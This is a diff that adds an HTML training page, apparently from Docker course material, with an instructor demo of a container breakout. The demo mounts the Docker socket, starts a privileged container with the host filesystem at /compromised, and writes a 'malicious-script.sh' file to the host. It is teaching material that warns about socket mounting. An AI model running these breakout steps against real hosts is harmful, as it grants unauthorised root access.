@@ -1,0 +1,61 @@
+<html>
+<head>
+    <title>simple-breakout-demo.md</title>
+    <link href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css' rel='stylesheet' integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u' crossorigin='anonymous'>
+    <link href="../app.css" rel="stylesheet" >
+</head>
+<body>
+    <nav class="navbar navbar-default">
+    <div class="container">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="../index.html"><img class="logo" src="https://www.docker.com/sites/all/themes/docker/assets/images/brand-full.svg" alt="Docker" title="Docker"/></a>
+        </div>
+    </div><!-- /.container-fluid -->
+    </nav>
+    <div class="container">
+    <div class="row">
+        <div class="content">
+            <h1 id="instructor-demo-a-simple-breakout">Instructor Demo: A Simple Breakout</h1>
+<p>Anyone, including a container, with access to the Docker socket effectively has root access to the Docker host. In this demo, we&#39;ll illustrate:</p>
+<ul>
+<li>A trivial container breakout possible when mounting the docker socket.</li>
+</ul>
+<h2 id="gaining-root-access-to-the-docker-host">Gaining Root access to the Docker Host</h2>
+<ol>
+<li><p>Run a container that mounts the docker socket:</p>
+<pre><code class="lang-bash">[centos@ucp-node-1 ~]$ docker container run -v \
+    /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh
+</code></pre>
+<p>This is a common pattern for containerized applications that need to be able to run Docker commands on their host; think of a containerized build daemon that needs to run <code>docker image build</code> commands, containerized log daemons that want to hit <code>docker container logs</code>, or host management containers like &#39;Docker in Docker&#39; tools.</p>
+</li>
+<li><p>From a shell inside this container, launch a privileged container which mounts the whole host&#39;s filesystem:</p>
+<pre><code class="lang-bash">/ # docker container run --privileged -v /:/compromised -it centos:7 bash
+</code></pre>
+</li>
+<li><p>Now from within this container, an attacker has full root privileges to the host, with the host&#39;s entire filesystem mounted at <code>/compromised</code>:</p>
+<pre><code class="lang-bash">[root@99408fad7cff /]# ls
+anaconda-post.log  bin  compromised  dev  etc  home  lib  lib64  media  mnt ...
+
+[root@99408fad7cff /]# touch compromised/malicious-script.sh
+</code></pre>
+</li>
+<li><p>Exit both the containers you&#39;re currently connected to (remember you&#39;re &#39;two layers&#39; deep right now), and list <code>/</code> on your host&#39;s filesystem; <code>malicious-script.sh</code> is there, proving we were able to gain write access anywhere on the host from within a container that mounts the Docker socket.</p>
+</li>
+</ol>
+
+        </div>        
+    </div>
+    <div class="row">
+        <ul class="mt-article-pagination" style="display:block;">
+        </ul>
+    </div>
+</div>
+    <div class="footer"></div>
+</body>
